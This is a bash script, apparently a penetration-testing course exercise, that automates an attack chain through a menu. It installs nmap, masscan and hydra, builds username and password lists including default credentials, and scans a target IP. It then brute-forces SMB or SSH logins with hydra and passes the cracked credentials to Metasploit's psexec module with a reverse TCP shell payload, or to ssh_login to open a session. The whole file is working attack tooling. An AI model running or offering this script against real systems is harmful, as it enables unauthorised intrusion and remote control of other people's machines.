#!/bin/bash

# Global Initialize - to reset log.txt at start up
rm -f log.txt

# Global Variables - for repeated use downstream
dt=$(date '+%d/%m/%Y %H:%M:%S')
strng="User started"

# Functions
function app_install() #Install relevant programs
{
declare -a install_list=("openssh-server" "nmap" "masscan" "hydra")

for app in ${install_list[@]}
do
	strng="Installing $app"
	log
	sudo apt-get -y install "$app" > /dev/null
done
return_menu
}

function brute_list() #Generate usernames and passwords
{
crunch 1 2 123 > user.lst 2>&1
crunch 1 2 123 > pass.lst 2>&1
echo "administrator" >> user.lst
echo "Passw0rd!" >> pass.lst
echo "kali" >> user.lst
echo "kali" >> pass.lst
clear
}

function log() #Log activities to log.txt
{
echo "$dt $strng" >> log.txt
}

function menu() #interactive menu
{
# learn from https://codeahoy.com/learn/introtobash/ch14/

strng="User at Menu"
log

echo -ne "
Menu
1) Install Apps
2) Scan IP Address
3) Attack IP Address
4) Check Log
5) Clear screen
0) Exit
Choose an option:"
read a
case $a in
	1) echo "1) Install Apps selected" ; app_install ;;
	2) echo "2) Scan IP Address selected" ; launch_scan ;;
	3) echo "3) Attack IP Address selected" ; launch_attack ;;
	4) echo "4) Check Log selected" ; check_log ;;
	5) clear; menu;;
	0) exit 0 ;;
*) echo "Invalid option"; menu;;
esac
}

function return_menu() #return to interactive menu
{
read -p "Press enter key to return to menu."
menu	
}

function target_ip() #handle target ip address
{
echo "Enter Target IP Address:"
read targetip	

strng="User set $targetip as target IP."
log
}

function check_log() #view log.txt
{
strng="User check log"
log

cat log.txt
return_menu
}

function launch_scan() #Scan methods
{
target_ip

read -p "Type 1 - for NMAP Scan OR Type 2 - for MASSCAN " Selection
case "$Selection" in
        1)
		strng="NMAP Scan started.."
		log
                echo "You have selected NMAP Scan on $targetip"
		sudo nmap "$targetip" -sV -Pn -O -p1-500 -oG ./nmap_"$(date '+%Y-%m-%d')"
		return_menu
        ;;
        2)
		strng="MASSCAN started.."
		log			
                echo "You have selected MASSCAN on $targetip"
		sudo masscan "$targetip" -p1-500 -oG ./masscan_"$(date '+%Y-%m-%d')"
		cat ./masscan_"$(date '+%Y-%m-%d')"
		return_menu
        ;;
        esac
}

function launch_attack() #Attack methods
{
strng="User launching attack.."
log

read -p "Type 1 - for Windows SMB Attack OR Type 2 - for Linux SSH Attack " Selection
target_ip
case "$Selection" in
        1)
		strng="Windows SMB Attack started.."
		log
                echo "You have selected Windows SMB Attack on $targetip"
                #Leverage on Hydra
                rm -f hydra.txt
                sudo hydra -L user.lst -P pass.lst "$targetip" smb -vV -o hydra.txt
                username=$(cat hydra.txt|sort -u|grep host|awk '{print$5}'|tail -n 1)
                pwd=$(cat hydra.txt|sort -u|grep host|awk '{print$7}'|tail -n 1)
                
                ##ONLY UNIQUE PASS and USER for exploit/windows/smb/psexec				
		spool_data="spool win_smb_$(date '+%Y-%m-%d').log ;"
		sel_exploit="use exploit/windows/smb/psexec ;"
		set_exploit="set RHOSTS $targetip; set SMBUser $username;set SMBPass $pwd;set payload windows/x64/shell_reverse_tcp ;"
		run_exploit="exploit;"
			
		sudo msfconsole -q -x "$spool_data $sel_exploit $set_exploit $run_exploit"
		
		return_menu
        ;;
        2)
		strng="Linux SSH Attack started.."
		log			
                echo "You have selected Linux SSH Attack on $targetip"
                #Leverage on Hydra
                rm -f hydra.txt
                sudo hydra -L user.lst -P pass.lst "$targetip" ssh -vV -o hydra.txt
                username=$(cat hydra.txt|sort -u|grep host|awk '{print$5}'|tail -n 1)
                pwd=$(cat hydra.txt|sort -u|grep host|awk '{print$7}'|tail -n 1)
				
		##PASS_FILE and USER_FILE available	for use auxiliary/scanner/ssh/ssh_login						
		spool_data="spool linux_ssh_$(date '+%Y-%m-%d').log ;"
		sel_exploit="use auxiliary/scanner/ssh/ssh_login ;"
		set_exploit="set RHOSTS $targetip ; set USERNAME $username; set PASSWORD $pwd;"
		run_exploit="run; sessions; sessions 1"
				
		sudo msfconsole -q -x "$spool_data $sel_exploit $set_exploit $run_exploit"
		
		return_menu
        ;;
        esac

return_menu
}

# Script Flow
brute_list
log
menu
